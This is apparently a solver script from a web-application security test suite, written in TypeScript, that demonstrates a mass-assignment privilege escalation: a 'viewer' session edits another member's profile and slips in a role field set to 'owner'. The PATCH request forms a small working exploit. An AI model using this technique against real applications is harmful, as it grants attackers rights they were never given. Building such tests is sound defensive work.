// A low-privilege member edits a colleague's profile and slips a role field into the same update,
// raising that account above the privilege the caller was ever granted to assign.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const viewer = await ctx.login('viewer')
  const me = await ctx.fetch(ctx.path('me'), { session: viewer })
  const selfId = String((me.json?.user as { id?: string } | undefined)?.id ?? '')
  const list = await ctx.fetch(ctx.path('listMembers'), { session: viewer })
  const items = (list.json?.items ?? []) as Array<{ id: string; role: string }>
  const target = items.find((m) => m.role !== 'owner' && m.id !== selfId)
  if (!target) return
  const roleField = ctx.plan.params.role ?? 'role'
  await ctx.fetch(ctx.path('updateMember', { memberId: target.id }), {
    method: 'PATCH',
    session: viewer,
    body: { name: 'Team Member', [roleField]: 'owner' },
  })
}
